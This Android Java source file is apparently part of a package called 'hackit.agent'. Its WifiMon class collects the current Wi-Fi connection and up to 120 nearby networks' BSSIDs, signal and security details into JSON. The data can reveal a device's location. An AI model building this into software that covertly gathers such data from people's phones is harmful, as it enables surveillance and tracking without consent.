package com.hackit.agent;

import android.content.Context;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.Collections;
import java.util.Comparator;
import java.util.List;

/** Current association plus a scan sweep (throttled by the platform). */
final class WifiMon {
    private static final int SCAN_LIMIT = 120;

    @SuppressWarnings("deprecation")
    static JSONObject dump(Context ctx) {
        JSONObject out = new JSONObject();
        WifiManager wifi = (WifiManager) ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        if (wifi == null) {
            return out;
        }
        try {
            WifiInfo info = wifi.getConnectionInfo();
            if (info != null) {
                JSONObject current = new JSONObject();
                current.put("ssid", info.getSSID());
                current.put("bssid", info.getBSSID());
                current.put("rssi", info.getRssi());
                current.put("ip", intToIp(info.getIpAddress()));
                current.put("speed", info.getLinkSpeed());
                current.put("freq", info.getFrequency());
                out.put("current", current);
            }
            if (wifi.isWifiEnabled()) {
                wifi.startScan();
            }
            List<ScanResult> results = wifi.getScanResults();
            if (results != null) {
                Collections.sort(results, new Comparator<ScanResult>() {
                    @Override
                    public int compare(ScanResult a, ScanResult b) {
                        return b.level - a.level;
                    }
                });
                JSONArray nearby = new JSONArray();
                for (ScanResult result : results) {
                    if (nearby.length() >= SCAN_LIMIT) {
                        break;
                    }
                    JSONObject row = new JSONObject();
                    row.put("ssid", result.SSID);
                    row.put("bssid", result.BSSID);
                    row.put("rssi", result.level);
                    row.put("freq", result.frequency);
                    row.put("caps", result.capabilities);
                    row.put("ts", result.timestamp / 1000L);
                    nearby.put(row);
                }
                out.put("nearby", nearby);
            }
        } catch (Throwable exc) {
            Log.d("wifi: " + exc);
        }
        return out;
    }

    private static String intToIp(int value) {
        return (value & 0xff) + "." + ((value >> 8) & 0xff) + "."
                + ((value >> 16) & 0xff) + "." + ((value >> 24) & 0xff);
    }

    private WifiMon() {
    }
}
